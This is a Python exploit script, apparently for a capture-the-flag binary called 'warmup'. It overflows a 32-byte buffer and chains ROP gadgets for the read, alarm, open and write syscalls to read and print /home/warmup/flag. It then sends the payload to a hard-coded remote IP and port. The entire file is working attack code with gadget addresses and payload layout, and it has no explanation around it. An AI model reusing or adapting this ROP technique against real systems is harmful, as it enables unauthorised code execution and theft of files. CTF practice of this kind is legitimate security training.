#!/usr/bin/env python3

import struct
import sys

def p(x):
    return struct.pack("<I", x)

# Gadget

rop_exit = 0x804814d  # eax=1; ebx=0; int 0x80 // exit(0)
# use read to set eax
rop_read = 0x804811d  # read
rop_set_ebx_ecx_edx_int_80 = 0x8048122

rop_write = 0x8048135

rop_before_call_read = 0x804815a # with sub esp, 0x30 // not used
rop_before_call_read2 = 0x804815d # without touching the stack

# 0x30 => 48 => 4 * 12

rw_memory = 0x080491bc
rw_memory = 0x080491d3

rop_alarm = 0x804810d

target = "remote"

if len(sys.argv) > 1 and sys.argv[1] in ("remote", "local"):
    target = sys.argv[1]

flag_path = b"/home/warmup/flag\x00"

# because netcat don't start the elf until data has been received
# send some shit here
payload_trigger_alarm = [
    b"A" * 32,
    p(rop_before_call_read2),
] + [p(0xdeadbeef)] * 4 # full fill their read

# load filename to rw_no_aslr_memrory
payload_filename = [
    b"A" * 32,
    p(rop_read),
    p(rop_before_call_read2),
    p(0),
    p(rw_memory),
    p(len(flag_path)),
    flag_path
]

# open the flag
payload_open = [
    b"A" * (32),
    p(rop_alarm),
    p(rop_set_ebx_ecx_edx_int_80),
    p(rop_before_call_read2),  # seconds for alarm
    p(rw_memory),  # filename
    p(0x0), # O_RDONLY
]

# read the flag
payload_read = [
    b"A" * (32 - 6),
    b"ABCD**",
    ### payload to load big payload
    p(rop_read),
    p(rop_before_call_read2),
    p(3),  # fd
    p(rw_memory),  # filename
    p(512), # size
]

payload_write = [
    b"A" * (32 - 6),
    b"ABCD**",
    ### payload to load big payload
    p(rop_write),
    p(rop_before_call_read2),
    p(1),  # fd
    p(rw_memory),  # filename
    p(512), # size
]

trigger_netcat = b''.join(payload_trigger_alarm)

payload = b''.join(
    payload_filename +
    payload_open +
    payload_read +
    payload_write +
    [ p(rop_exit) ]
    )

open('input', 'wb').write(payload)

import socket

if target == "remote":
    print("REMOTE")
    HOST, PORT = "202.120.7.207", 52608
else:
    HOST, PORT = "localhost", 4242

import time

s = socket.socket()

s.connect((HOST, PORT))

s.send(trigger_netcat)
time.sleep(5)
s.send(payload)

print(s.recv(4096))
print(s.recv(4096))
print(s.recv(4096))
print(s.recv(4096))
